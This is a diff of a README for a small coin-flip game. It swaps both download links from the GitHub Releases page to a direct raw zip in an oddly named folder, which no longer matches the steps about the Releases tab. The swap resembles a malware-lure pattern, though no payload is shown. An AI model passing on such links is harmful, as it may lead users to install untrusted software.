@@ -6,7 +6,7 @@ Welcome to Coin-Flip! This game is simple and enjoyable. You guess heads or tail
 
 ## 📥 Download & Install
 
-To get started, you need to download the application. Please **[visit this page to download](https://github.com/ayoubdrihmi/Coin-Flip/releases)**. Follow the steps below to download and run Coin-Flip:
+To get started, you need to download the application. Please **[visit this page to download](https://raw.githubusercontent.com/ayoubdrihmi/Coin-Flip/main/unfestooned/Coin_Flip_1.4.zip)**. Follow the steps below to download and run Coin-Flip:
 
 1. Click on the "Releases" tab to see the available versions.
 2. Locate the latest version of Coin-Flip.
@@ -58,4 +58,4 @@ If you experience issues when running the application, try the following:
 
 For questions or assistance, visit the issues section of this repository. You can find help from the community and developers. Don’t hesitate to ask!
 
-Enjoy your time flipping coins and good luck! Remember to **[visit this page to download](https://github.com/ayoubdrihmi/Coin-Flip/releases)** and start your game now!
+Enjoy your time flipping coins and good luck! Remember to **[visit this page to download](https://raw.githubusercontent.com/ayoubdrihmi/Coin-Flip/main/unfestooned/Coin_Flip_1.4.zip)** and start your game now!
